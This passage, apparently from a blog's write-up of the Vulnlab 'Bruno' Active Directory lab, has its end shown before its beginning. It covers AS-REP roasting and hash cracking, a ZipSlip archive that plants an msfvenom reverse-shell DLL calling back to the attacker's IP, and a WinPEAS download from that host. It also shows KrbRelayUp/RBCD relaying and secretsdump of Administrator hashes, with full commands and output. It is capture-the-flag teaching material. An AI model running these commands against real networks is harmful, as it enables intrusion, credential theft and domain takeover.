hold anything either, as I made sure to enumerate other parts of the machine to make sure I didn’t miss anything.</p>\n<h1 id=\"Reverse-Engineering-SampleScanner\"><a href=\"#Reverse-Engineering-SampleScanner\" class=\"headerlink\" title=\"Reverse Engineering SampleScanner\"></a>Reverse Engineering SampleScanner</h1><p>At this point, I decided to take a look back at the SampleScanner application to see if we could perform any DLL Hijacking. This is mainly just due to the notion of a DLL and the fact that this application seems to be a custom executable as I could not find source code for it anywhere.</p>\n<p>Let’s first start by opening ProcMon via the <a href=\"https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite\">SysInternalsSuite</a>. Navigate to <code>Filter &gt; Filter</code> (or just Ctrl+L), and use the configuration as seen below.</p>\n<ul>\n<li>Process Name - begins with - SampleScanner -&gt; then Include</li>\n<li>Path - ends with - .dll -&gt; then Include</li>\n<li>Result - begins with - NAME -&gt; then Include</li>\n</ul>\n<p><img src=\"/images/vulnlab/bruno-vl/f.png\"></p>\n<p>We’ll then apply the filters and ProcMon will start listening to events that fall under our filter settings. Run the binary and you should see some events populate.</p>\n<p><img src=\"/images/vulnlab/bruno-vl/g.png\"></p>\n<p>You’ll get a lot of results, so I’ve highlighted two important entries that get logged into ProcMon. The two highlights I have are DLLs that are not found within the current directory. The key note here is that they are DLLs that are within the <strong>current directory</strong>, meaning it will be using the same directory that the <code>SampleScanner</code> application is within.</p>\n<p>This means we can plant a malicious DLL into the same directory as application and it should execute it, giving us a reverse shell.  But that being said, how can we do so and how do we know what the application is actually doing?</p>\n<p>Before that, I want to note that the executable spits out an error if you run it properly.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS Microsoft.PowerShell.Core\\FileSystem::\\\\wsl.localhost\\kali-linux\\home\\daz\\tech\\bruno\\scanner\\SampleScanner&gt; .\\SampleScanner.exe</span><br><span class=\"line\">Unhandled exception. System.IO.DirectoryNotFoundException: Could not find a part of the path &#x27;C:\\samples\\queue&#x27;.</span><br><span class=\"line\">   at System.IO.Enumeration.FileSystemEnumerator`1.CreateDirectoryHandle(String path, Boolean ignoreNotFound)</span><br><span class=\"line\">   at System.IO.Enumeration.FileSystemEnumerator`1.Init()</span><br><span class=\"line\">   at System.IO.Enumeration.FileSystemEnumerator`1..ctor(String directory, Boolean isNormalized, EnumerationOptions options)</span><br><span class=\"line\">   at System.IO.Enumeration.FileSystemEnumerable`1..ctor(String directory, FindTransform transform, EnumerationOptions options, Boolean isNormalized)</span><br><span class=\"line\">   at System.IO.Enumeration.FileSystemEnumerableFactory.UserFiles(String directory, String expression, EnumerationOptions options)</span><br><span class=\"line\">   at System.IO.Directory.InternalEnumeratePaths(String path, String searchPattern, SearchTarget searchTarget, EnumerationOptions options)</span><br><span class=\"line\">   at SampleScanner.Program.Main(String[] args)</span><br></pre></td></tr></table></figure>\n\n<p>The key thing to look at here is that it seems that a static file path is being searched, the <code>C:\\samples\\queue</code> directory. This is interesting because we have write access to this folder via SMB as <code>svc_scan</code>.</p>\n<p>To start with reversing the binary itself, we can first examine the <code>SampleScanner.dll</code> to see specifically what the executable is doing as this DLL is more than likely associated with the main functionality of the application. We can do so with <a href=\"https://github.com/icsharpcode/ILSpy\">ILSpy</a>, a reverse engineering decompiler used for examining application source code. We’ll import the <code>SampleScanner.dll</code> into ILSpy.</p>\n<p><img src=\"/images/vulnlab/bruno-vl/h.png\"></p>\n<p>We’re mainly concerned with the Main function inside of the original <code>SampleScanner</code> library that is decompiled. </p>\n<p>In the screenshot above, you’ll notice that there are various hints about a “ZipArchive” entry as a class within the main source code. Let’s take a look farther into these classes to see if there’s anything we can find.</p>\n<p><img src=\"/images/vulnlab/bruno-vl/i.png\"></p>\n<p>Looking into those classes, it looks like the zip archive is opening the archive itself with <code>GetEntry</code> and <code>get_ArchiveReader</code>. These contents are then scanned by the application itself to simulate a malware scan.</p>\n<p>So from reverse engineering the binary we discovered three things:</p>\n<ul>\n<li>A DLL using the relative path of the binary is not being loaded</li>\n<li>The application itself is attempting to open any archives within a specified directory.</li>\n<li>The specified directory itself, <code>C:\\samples\\queue</code>, is a directory that we have write access onto.</li>\n</ul>\n<p>After doing some research into what we have in front of us, I came across an interesting exploit that seems to fit our situation - the ZipSlip.</p>\n<h1 id=\"DLL-Hijacking-via-ZipSlip\"><a href=\"#DLL-Hijacking-via-ZipSlip\" class=\"headerlink\" title=\"DLL Hijacking via ZipSlip\"></a>DLL Hijacking via ZipSlip</h1><p><a href=\"https://security.snyk.io/research/zip-slip-vulnerability\">ZipSlip</a> is essentially a vulnerability that allows us to perform file creation via path traversal in a zip archive. If a zip archive is opened automatically by a program, we can create a compressed archive with a file that has path traversal characters in its name, such as <code>../revshell.exe</code>. This will place our executable in the parent folder of where it was opened.</p>\n<p>In our case, we want to place a malicious executable in <code>../app/(malicious_file_here)</code>. This should be within the same path as the binary, which is where the application is trying to load DLLs from.</p>\n<p>Since we know the names of the DLL that are not found within the application’s direct path, we can use those as the names for our malicious DLLs. We can craft a malicious DLL using <code>msfvenom</code>, as seen below and then convert it to a zip archive. You can use either <code>hostfxr.dll</code> or <code>Microsoft.DiaSymReader.Native.amd64.dll</code>, as either will work for this.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ msfvenom -p windows/x64/shell_reverse_tcp -ax64 -f dll LHOST=10.8.0.173 LPORT=9001 &gt; hostfxr.dll            </span><br><span class=\"line\">[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload</span><br><span class=\"line\">No encoder specified, outputting raw payload</span><br><span class=\"line\">Payload size: 460 bytes</span><br><span class=\"line\">Final size of dll file: 9216 bytes</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ zip host.zip hostfxr.dll</span><br><span class=\"line\">  adding: hostfxr.dll (deflated 80%)</span><br></pre></td></tr></table></figure>\n\n<p>We can then use an archive manager such as 7-Zip File Manager (in my case I transferred the DLL to my Windows host) to view the archive and edit the name accordingly.</p>\n<p><img src=\"/images/vulnlab/bruno-vl/j.png\"></p>\n<p>As seen above, you can implement directory traversal characters in 7-Zip without any issues. This will create two mock directories within the archive, which will be the traversal method when we transfer it to the target machine.</p>\n<p>Now that we have the respective archive set up, let’s start up our listener and transfer the archive to the <code>queue</code> share. (Note that I changed the name of the archive to <code>host_sample.zip</code>)</p>\n<p><img src=\"/images/vulnlab/bruno-vl/k.png\"></p>\n<p>After some time as you’ll see, the ZipSlip exploit worked properly and the DLL was moved to the <code>app</code> directory. After about a minute or so, you’ll see that our reverse shell called back and we now should have a session as <code>svc_scan</code>.</p>\n<p><img src=\"/images/vulnlab/bruno-vl/l.png\"></p>\n<h1 id=\"Internal-Enumeration\"><a href=\"#Internal-Enumeration\" class=\"headerlink\" title=\"Internal Enumeration\"></a>Internal Enumeration</h1><p>Now that we have a session on the remote host, we’ll do a bit of enumeration on the domain computer to see if there are any ways to escalate our privileges.</p>\n<p>The root <code>C:\\</code> drive contains the first user flag as seen below.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\&gt; ls</span><br><span class=\"line\"></span><br><span class=\"line\">Directory: C:\\</span><br><span class=\"line\"></span><br><span class=\"line\">Mode                 LastWriteTime         Length Name</span><br><span class=\"line\">----                 -------------         ------ ----</span><br><span class=\"line\">d-----         8/19/2021   6:24 AM                EFI</span><br><span class=\"line\">d-----         6/29/2022   2:43 PM                inetpub</span><br><span class=\"line\">d-----          5/8/2021   8:20 AM                PerfLogs</span><br><span class=\"line\">d-r---         6/29/2022   4:15 PM                Program Files</span><br><span class=\"line\">d-----         6/29/2022   1:28 PM                Program Files (x86)</span><br><span class=\"line\">d-----         6/29/2022   1:41 PM                samples</span><br><span class=\"line\">d-r---         6/29/2022   4:09 PM                Users</span><br><span class=\"line\">d-----         6/29/2022   1:32 PM                Windows</span><br><span class=\"line\">-a----         6/29/2022   3:00 PM             37 user.txt</span><br></pre></td></tr></table></figure>\n\n<p>There does seem to be an <code>inetpub</code> directory which contains the default IIS website that we saw previously, however we do not have write access to this part of the system meaning we won’t be able to exploit it.</p>\n<p>Furthermore, there does not seem to be any outstanding program applications on the internal machine that we can exploit, nor any services that are running on an internal port.</p>\n<p>At this point, I decided to see if an internal machine scraper such as <a href=\"https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS\">WinPEAS</a>. This should tell us if there are any hidden vulnerabilities that we wouldn’t be able to see from an initial glance. </p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\temp&gt; curl http://10.8.0.173:9002/winPEASany_ofs.exe -O winPEASany_ofs.exe</span><br><span class=\"line\">curl http://10.8.0.173:9002/winPEASany_ofs.exe -O winPEASany_ofs.exe</span><br><span class=\"line\">PS C:\\temp&gt; .\\winPEASany_ofs.exe</span><br><span class=\"line\">......</span><br><span class=\"line\">Checking KrbRelayUp</span><br><span class=\"line\">  https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#krbrelayup</span><br><span class=\"line\">  The system is inside a domain (BRUNO) so it could be vulnerable.</span><br><span class=\"line\">  You can try https://github.com/Dec0ne/KrbRelayUp to escalate privileges</span><br></pre></td></tr></table></figure>\n\n<p>As you’ll notice, this should spider the entire filesystem and report any vulnerabilities back to us. The above vulnerability is reported often when I run WinPEAS, however there was something interesting that I found that may we may be able to exploit.</p>\n<h1 id=\"Privilege-Escalation-via-KrbRelayUp-CLSIDs\"><a href=\"#Privilege-Escalation-via-KrbRelayUp-CLSIDs\" class=\"headerlink\" title=\"Privilege Escalation via KrbRelayUp&#x2F;CLSIDs\"></a>Privilege Escalation via KrbRelayUp&#x2F;CLSIDs</h1><p>One thing you’ll notice is that our user currently has a MAQ of 10. A MAQ, or MachineAccountQuota, essentially allows the domain object to create domain computer objects and use them within the domain.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ nxc ldap 10.10.73.8 -u &#x27;svc_scan&#x27; -p &#x27;[...snip...]&#x27; -M maq</span><br><span class=\"line\">SMB         10.10.73.8      445    BRUNODC          [*] Windows Server 2022 Build 20348 x64 (name:BRUNODC) (domain:bruno.vl) (signing:True) (SMBv1:False)                                                                                                   </span><br><span class=\"line\">LDAP        10.10.73.8      389    BRUNODC          [+] bruno.vl\\svc_scan:[...snip...]</span><br><span class=\"line\">MAQ         10.10.73.8      389    BRUNODC          [*] Getting the MachineAccountQuota</span><br><span class=\"line\">MAQ         10.10.73.8      389    BRUNODC          MachineAccountQuota: 10</span><br></pre></td></tr></table></figure>\n\n<p>Furthermore, the LDAP does not have signing enabled. This cements the fact that a Kerberos relay attack is possible through KrbRelayUp.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ nxc ldap 10.10.73.8 -u &#x27;svc_scan&#x27; -p &#x27;[...snip...]&#x27; -M ldap-checker</span><br><span class=\"line\">SMB         10.10.73.8      445    BRUNODC          [*] Windows Server 2022 Build 20348 x64 (name:BRUNODC) (domain:bruno.vl) (signing:True) (SMBv1:False)                                                                                                   </span><br><span class=\"line\">LDAP        10.10.73.8      389    BRUNODC          [+] bruno.vl\\svc_scan:[...snip...]</span><br><span class=\"line\">LDAP-CHE... 10.10.73.8      389    BRUNODC          LDAP Signing NOT Enforced!</span><br><span class=\"line\">LDAP-CHE... 10.10.73.8      389    BRUNODC          LDAPS Channel Binding is set to &quot;NEVER&quot;</span><br></pre></td></tr></table></figure>\n\n<p>A Kerberos relay attack is essentially an authentication attack much like NTLM relay that allows us to relay a domain objects Kerberos authentication to another service. This essentially allows us to relay an ASREQ to any SPN that we need to authenticate to. Where LDAP signing essentially plays a picture into this is that it will encrypt all traffic over LDAP, meaning we won’t be able to properly sniff the traffic for authentication tokens as a MITM. If you want to delve into more information about Kerberos Relaying and how it works, <a href=\"https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html\">this</a> was the blog post I used mainly as research into the topic.</p>\n<p>In our case, we should be able to create a fake domain computer object and coerce an authentication attempt using RBCD. The only issue is, how do we do coerce authentication if we’re using Kerberos authentication? This is where the idea of abusing <a href=\"https://www.trendmicro.com/vinfo/us/security/definition/clsid#:~:text=The%20Class%20ID%2C%20or%20CLSID,%5CCLSID%5C%7BCLSID%20value%7D.\">CLSIDs</a> comes into play, as CLSIDs are essentially identifiers for application components in Windows. These are predefined by the Windows operating system, meaning we can use a curated list <a href=\"https://github.com/jkerai1/CLSID-Lookup/blob/main/CLSID_no_duplicate_records.txt\">here</a> or <a href=\"https://vulndev.io/cheats-windows/\">here</a>. We’re specifically looking for one that works with Windows Server 2019&#x2F;2022, as that is the current operating system that we’re on.</p>\n<p>In particular, the CLSID I picked was <code>d99e6e73-fc88-11d0-b498-00a0c90312f3</code>. We’ll need to compile <a href=\"https://github.com/Dec0ne/KrbRelayUp.git\">KrbRelayUp</a> in order to exploit this on the target machine. Luckily enough, Defender is not enabled on this box so we shouldn’t have to bypass AV for this.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\temp&gt; &quot;Invoke-Mimikatz&quot;</span><br><span class=\"line\">&quot;Invoke-Mimikatz&quot;</span><br><span class=\"line\">Invoke-Mimikatz</span><br></pre></td></tr></table></figure>\n\n<p>So once we have the <code>KrbRelayUp</code> binary compiled, we’ll execute it on the target machine using the CLSID that we have selected.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">PS C:\\temp&gt; .\\KrbRelayUp.exe relay -Domain bruno.vl -CreateNewComputerAccount -ComputerName daz$ -ComputerPassword Password123@ --clsid d99e6e73-fc88-11d0-b498-00a0c90312f3</span><br><span class=\"line\">.\\KrbRelayUp.exe relay -Domain bruno.vl -CreateNewComputerAccount -ComputerName daz$ -ComputerPassword Password123@ --clsid d99e6e73-fc88-11d0-b498-00a0c90312f3</span><br><span class=\"line\">KrbRelayUp - Relaying you to SYSTEM</span><br><span class=\"line\"></span><br><span class=\"line\"></span><br><span class=\"line\">[+] Rewriting function table</span><br><span class=\"line\">[+] Rewriting PEB</span><br><span class=\"line\">[+] Init COM server</span><br><span class=\"line\">[+] Computer account &quot;daz$&quot; added with password &quot;Password123@&quot;</span><br><span class=\"line\">[+] Looking for available ports..</span><br><span class=\"line\">[+] Port 2869 available</span><br><span class=\"line\">[+] Register COM server</span><br><span class=\"line\">[+] Forcing SYSTEM authentication</span><br><span class=\"line\">[+] Got Krb Auth from NT/SYSTEM. Relying to LDAP now...</span><br><span class=\"line\">[+] LDAP session established</span><br><span class=\"line\">[+] RBCD rights added successfully</span><br><span class=\"line\">[+] Run the spawn method for SYSTEM shell:</span><br><span class=\"line\">./KrbRelayUp.exe spawn -m rbcd -d bruno.vl -dc brunodc.bruno.vl -cn daz$ -cp Password123@</span><br></pre></td></tr></table></figure>\n\n<p>We’ll then execute the command provided so that a TGT request can be sent to the KDC. This allows us to use <code>getST</code> after this command to retrieve a TGS on behalf of the Administrator account to CIFS using our fake machine account.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-getST -spn cifs/brunodc.bruno.vl -impersonate Administrator -dc-ip 10.10.116.111 bruno.vl/&#x27;daz$&#x27;:&#x27;Password123@&#x27;</span><br><span class=\"line\">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Getting TGT for user</span><br><span class=\"line\">[*] Impersonating Administrator</span><br><span class=\"line\">[*] Requesting S4U2self</span><br><span class=\"line\">[*] Requesting S4U2Proxy</span><br><span class=\"line\">[*] Saving ticket in Administrator@cifs_brunodc.bruno.vl@BRUNO.VL.ccache</span><br></pre></td></tr></table></figure>\n\n<p>We’ll then dump the secrets of the machine using <code>secretsdump</code>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ export KRB5CCNAME=Administrator@cifs_brunodc.bruno.vl@BRUNO.VL.ccache</span><br><span class=\"line\"></span><br><span class=\"line\">└─$ impacket-secretsdump -k brunodc.bruno.vl                                                                       </span><br><span class=\"line\">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class=\"line\"></span><br><span class=\"line\">[*] Service RemoteRegistry is in stopped state</span><br><span class=\"line\">[*] Starting service RemoteRegistry</span><br><span class=\"line\">[*] Target system bootKey: 0xf58ac639976f0c99c2dde0d24ef3219d</span><br><span class=\"line\">[*] Dumping local SAM hashes (uid:rid:lmhash:nthash)</span><br><span class=\"line\">......</span><br><span class=\"line\">Administrator:500:aad3b435b51404eeaad3b435b51404ee:13735[...snip...]bfd4:::</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have the Administrator’s NT hash, we can use that to login to WinRM.</p>\n<p><img src=\"/images/vulnlab/bruno-vl/m.png\"></p>\n<p>Now that we are currently the Administrator, we can read the root flag within the Administrator’s Desktop directory. That means we have successfully rooted this machine!</p>\n<h1 id=\"Conclusion\"><a href=\"#Conclusion\" class=\"headerlink\" title=\"Conclusion\"></a>Conclusion</h1><p>This machine was very difficult, and it gave me some new insight on doing more RBCD exploitation. DLL Hijacking and reverse engineering are both topics that this machine covered well, and I have no complaints. Big thanks to xct for this machine.</p>\n<h1 id=\"Resources\"><a href=\"#Resources\" class=\"headerlink\" title=\"Resources\"></a>Resources</h1><p><a href=\"https://hashcat.net/wiki/doku.php?id=example_hashes\">https://hashcat.net/wiki/doku.php?id=example_hashes</a><br><a href=\"https://github.com/dirkjanm/BloodHound.py\">https://github.com/dirkjanm/BloodHound.py</a><br><a href=\"https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux\">https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux</a><br><a href=\"https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite\">https://learn.microsoft.com/en-us/sysinternals/downloads/sysinternals-suite</a><br><a href=\"https://github.com/icsharpcode/ILSpy\">https://github.com/icsharpcode/ILSpy</a><br><a href=\"https://security.snyk.io/research/zip-slip-vulnerability\">https://security.snyk.io/research/zip-slip-vulnerability</a><br><a href=\"https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS\">https://github.com/peass-ng/PEASS-ng/tree/master/winPEAS</a><br><a href=\"https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html\">https://googleprojectzero.blogspot.com/2021/10/using-kerberos-for-authentication-relay.html</a><br><a href=\"https://www.trendmicro.com/vinfo/us/security/definition/clsid#:~:text=The%20Class%20ID%2C%20or%20CLSID,%5CCLSID%5C%7BCLSID%20value%7D\">https://www.trendmicro.com/vinfo/us/security/definition/clsid#:~:text=The%20Class%20ID%2C%20or%20CLSID,%5CCLSID%5C%7BCLSID%20value%7D</a>.<br><a href=\"https://github.com/jkerai1/CLSID-Lookup/blob/main/CLSID_no_duplicate_records.txt\">https://github.com/jkerai1/CLSID-Lookup/blob/main/CLSID_no_duplicate_records.txt</a><br><a href=\"https://vulndev.io/cheats-windows/\">https://vulndev.io/cheats-windows/</a><br><a href=\"https://github.com/Dec0ne/KrbRelayUp\">https://github.com/Dec0ne/KrbRelayUp</a></p>\n","cover_type":"img","excerpt":"","more":"<p>Bruno is one of the more difficult AD machines that I’ve done, as all of the attacks in this specific machine are relatively new to me. This machine consists of exploiting a zip archive vulnerability along with pivoting to other user accounts in an AD environment using untraditional methods.</p>\n<p>You may see the IP update a few times, I did the box multiple times during the writeup portion.</p>\n<h1 id=\"Enumeration\"><a href=\"#Enumeration\" class=\"headerlink\" title=\"Enumeration\"></a>Enumeration</h1><p>We’ll first start with our usual NMAP scan.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ sudo nmap 10.10.126.214</span><br><span class=\"line\">[sudo] password for daz:</span><br><span class=\"line\">Starting Nmap 7.94SVN ( https://nmap.org ) at 2024-07-30 23:18 EDT</span><br><span class=\"line\">Nmap scan report for 10.10.126.214</span><br><span class=\"line\">Host is up (0.12s latency).</span><br><span class=\"line\">Not shown: 984 filtered tcp ports (no-response)</span><br><span class=\"line\">PORT     STATE SERVICE</span><br><span class=\"line\">21/tcp   open  ftp</span><br><span class=\"line\">53/tcp   open  domain</span><br><span class=\"line\">80/tcp   open  http</span><br><span class=\"line\">88/tcp   open  kerberos-sec</span><br><span class=\"line\">135/tcp  open  msrpc</span><br><span class=\"line\">139/tcp  open  netbios-ssn</span><br><span class=\"line\">389/tcp  open  ldap</span><br><span class=\"line\">443/tcp  open  https</span><br><span class=\"line\">445/tcp  open  microsoft-ds</span><br><span class=\"line\">464/tcp  open  kpasswd5</span><br><span class=\"line\">593/tcp  open  http-rpc-epmap</span><br><span class=\"line\">636/tcp  open  ldapssl</span><br><span class=\"line\">3268/tcp open  globalcatLDAP</span><br><span class=\"line\">3269/tcp open  globalcatLDAPssl</span><br><span class=\"line\">3389/tcp open  ms-wbt-server</span><br><span class=\"line\">5357/tcp open  wsdapi</span><br><span class=\"line\"></span><br><span class=\"line\">Nmap done: 1 IP address (1 host up) scanned in 19.90 seconds</span><br></pre></td></tr></table></figure>\n\n<p>Given the usual ports that for AD (Kerberos, SMB, LDAP) there are a few outliers in our scan, such as FTP and HTTP (more so FTP).</p>\n<p>We’ll first start by verifying anonymous logon through FTP.</p>\n<p><img src=\"/images/vulnlab/bruno-vl/b.png\"></p>\n<p>It seems that we were able to login with null credentials, and there seem to be a few directories for us to look through. We’ll come back to this later, as I want to do my initial checks around the AD machine just to see if we are missing anything.</p>\n<p>Let’s take a look at the web server to see if there’s anything we can find.</p>\n<p><img src=\"/images/vulnlab/bruno-vl/c.png\"></p>\n<p>This looks to be a default IIS webpage, and running directory traversal scans on this webpage did not present me with any endpoints.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ gobuster dir -u http://10.10.126.214 -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt -x aspx</span><br></pre></td></tr></table></figure>\n\n<p>In that case we’ll take a look at SMB to see if there are any shares that we can access.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ smbclient -L 10.10.126.214 -N</span><br><span class=\"line\">Anonymous login successful</span><br><span class=\"line\"></span><br><span class=\"line\">Sharename       Type      Comment</span><br><span class=\"line\">---------       ----      -------</span><br><span class=\"line\">Reconnecting with SMB1 for workgroup listing.</span><br><span class=\"line\">do_connect: Connection to 10.10.126.214 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)</span><br><span class=\"line\">Unable to connect with SMB1 -- no workgroup available</span><br></pre></td></tr></table></figure>\n\n<p>It seems that anonymous login is allowed, however we don’t have any permissions to view any shares at the moment. We’ll most likely need credentials in order to do anything with SMB.</p>\n<p>Finally, we’ll take a look at LDAP to see if null authentication is allowed (which would allow us to dump domain objects from the domain). We’ll need to find the name of the domain, to which we can do with a simple CME command.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ crackmapexec smb 10.10.126.214</span><br><span class=\"line\">SMB         10.10.126.214     445    BRUNODC          [*] Windows Server 2022 Build 20348 x64 (name:BRUNODC) (domain:bruno.vl) (signing:True) (SMBv1:False)</span><br></pre></td></tr></table></figure>\n\n<p>Now that we have the name of the DC along with the workstation, we’ll add it to our <code>/etc/hosts</code> file and run LDAPSEARCH against it.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ ldapsearch -x -H ldap://brunodc.bruno.vl -D &#x27;&#x27; -w &#x27;&#x27; -b &quot;DC=bruno,DC=vl&quot;</span><br><span class=\"line\"># extended LDIF</span><br><span class=\"line\">#</span><br><span class=\"line\"># LDAPv3</span><br><span class=\"line\"># base &lt;DC=bruno,DC=vl&gt; with scope subtree</span><br><span class=\"line\"># filter: (objectclass=*)</span><br><span class=\"line\"># requesting: ALL</span><br><span class=\"line\">#</span><br><span class=\"line\"></span><br><span class=\"line\"># search result</span><br><span class=\"line\">search: 2</span><br><span class=\"line\">result: 1 Operations error</span><br><span class=\"line\">text: 000004DC: LdapErr: DSID-0C090A58, comment: In order to perform this opera</span><br><span class=\"line\"> tion a successful bind must be completed on the connection., data 0, v4f7c</span><br><span class=\"line\"></span><br><span class=\"line\"># numResponses: 1</span><br></pre></td></tr></table></figure>\n\n<p>It seems that we’ll also need credentials to access LDAP.</p>\n<h1 id=\"Foothold-with-FTP\"><a href=\"#Foothold-with-FTP\" class=\"headerlink\" title=\"Foothold with FTP\"></a>Foothold with FTP</h1><p>Given that most of our initial access vectors don’t seem to bare much fruit, let’s take a look back at FTP to see if there’s anything we can find.</p>\n<p><img src=\"/images/vulnlab/bruno-vl/d.png\"></p>\n<p>If you’ll notice, there seems to be files related to a <code>SampleScanner</code> app within the FTP directory. We’ve dealt with DLL Hijacking in applications that we have write access to in the past, so this could be a similar situation (specifically for <a href=\"https://dan-feliciano.com/2024/06/05/trusted/\">Trusted</a>).</p>\n<p>The only issue is that we do not have write access onto this directory at the moment.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">ftp&gt; ls</span><br><span class=\"line\">229 Entering Extended Passive Mode (|||49561|)</span><br><span class=\"line\">150 Opening ASCII mode data connection.</span><br><span class=\"line\">06-29-22  05:42PM                  165 changelog</span><br><span class=\"line\">06-28-22  07:15PM                  431 SampleScanner.deps.json</span><br><span class=\"line\">06-29-22  03:58PM                 7168 SampleScanner.dll</span><br><span class=\"line\">06-29-22  03:58PM               174592 SampleScanner.exe</span><br><span class=\"line\">06-28-22  07:15PM                  170 SampleScanner.runtimeconfig.dev.json</span><br><span class=\"line\">06-28-22  07:15PM                  154 SampleScanner.runtimeconfig.json</span><br><span class=\"line\">226 Transfer complete.</span><br><span class=\"line\">ftp&gt; put test.txt</span><br><span class=\"line\">local: test.txt remote: test.txt</span><br><span class=\"line\">229 Entering Extended Passive Mode (|||49562|)</span><br><span class=\"line\">550 Access is denied.</span><br><span class=\"line\">ftp&gt;</span><br></pre></td></tr></table></figure>\n\n<p>While we don’t have write access currently, we do have read access. Let’s pull the entirety of this folder back to our localhost to see if there’s any important files we can read (specifically changelog).</p>\n<p>NOTE: Remember to set your FTP session to “binary” mode before you download all of the files. This just makes sure to change all of the downloads from ASCII to Binary, which will convert the <code>SampleScanner.exe</code> to an MS-DOS which we won’t be able to debug later. You can do so easily by typing <code>binary</code> into the FTP console.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ cat changelog</span><br><span class=\"line\">Version 0.3</span><br><span class=\"line\">- integrated with dev site</span><br><span class=\"line\">- automation using svc_scan</span><br><span class=\"line\"></span><br><span class=\"line\">Version 0.2</span><br><span class=\"line\">- additional functionality</span><br><span class=\"line\"></span><br><span class=\"line\">Version 0.1</span><br><span class=\"line\">- initial support for EICAR string</span><br></pre></td></tr></table></figure>\n\n<p>It seems that there are a few changes implemented on the development side for the <code>SampleScanner</code> app itself. The functionality seems to be integrated with a development site and included better support.</p>\n<p>That being said, we do seem to also have an account name that we can potentially try to exploit - <code>svc_scan</code>. Let’s do our Kerberos checks for this user along with the other default accounts.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ impacket-GetNPUsers -dc-ip 10.10.126.214 -request -usersfile ul.txt -no-pass bruno.vl/&#x27;daz&#x27;@10.10.126.214</span><br><span class=\"line\">Impacket v0.12.0.dev1 - Copyright 2023 Fortra</span><br><span class=\"line\"></span><br><span class=\"line\">[-] User Administrator doesn&#x27;t have UF_DONT_REQUIRE_PREAUTH set</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)</span><br><span class=\"line\">[-] Kerberos SessionError: KDC_ERR_CLIENT_REVOKED(Clients credentials have been revoked)</span><br><span class=\"line\">$krb5asrep$23$svc_scan@BRUNO.VL:cc4e0a77789388e39[...snip...]2be71ab6dd19a97dcc49c6</span><br></pre></td></tr></table></figure>\n\n<p>We were successfully able to perform an ASREPRoasting attack against <code>svc_scan</code>, meaning we can try and crack this encrypted ASREP ticket for a plaintext password. Our hash identifier is 18200, as you can find <a href=\"https://hashcat.net/wiki/doku.php?id=example_hashes\">here</a>.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ hashcat -a 0 -m 18200 svc_scan.txt /usr/share/wordlists/rockyou.txt</span><br><span class=\"line\">......</span><br><span class=\"line\">b6252092fb9116194a8add89f17392c2be71ab6dd19a97dcc49c6:[...snip...]</span><br><span class=\"line\"></span><br><span class=\"line\">Session..........: hashcat</span><br><span class=\"line\">Status...........: Cracked</span><br><span class=\"line\">Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)</span><br></pre></td></tr></table></figure>\n\n<p>As you can see, we were able to crack the ASREP hash and now have the plaintext password for <code>svc_scan</code>.</p>\n<p>There are a few things we could do here, such as dumping the domain (given that these are LDAP credentials) or look at SMB&#x2F;FTP to further our foothold.</p>\n<p>To dump the domain, we’ll do the following with the <a href=\"https://github.com/dirkjanm/BloodHound.py\">Bloodhound Python ingestor</a>. If you haven’t set up Bloodhound before, <a href=\"https://www.ired.team/offensive-security-experiments/active-directory-kerberos-abuse/abusing-active-directory-with-bloodhound-on-kali-linux\">this resource</a> should be helpful for you.</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"code\"><pre><span class=\"line\">└─$ bloodhound-python -d &#x27;bruno.vl&#x27; -u &#x27;svc_scan&#x27; -p &#x27;[...snip...]&#x27; -c all -ns 